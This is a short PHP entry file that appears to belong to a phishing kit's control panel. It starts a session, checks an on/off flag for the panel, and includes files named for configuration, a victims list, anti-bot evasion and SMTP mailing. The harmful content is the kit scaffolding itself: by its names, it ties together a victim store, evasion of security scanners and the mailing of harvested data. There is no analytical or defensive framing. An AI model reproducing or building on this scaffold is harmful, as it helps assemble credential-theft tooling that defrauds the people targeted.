
<?php

session_start();

$PANEL_ONLINE = "true";

if ($PANEL_ONLINE != "true") { die(""); }


require( 'config.php' );
require( 'victims.php' );
require( 'antibot.php' );
require( 'smtp.php' );


//ini_set('display_errors', '1');
//ini_set('display_startup_errors', '1');
//error_reporting(E_ALL);

?>

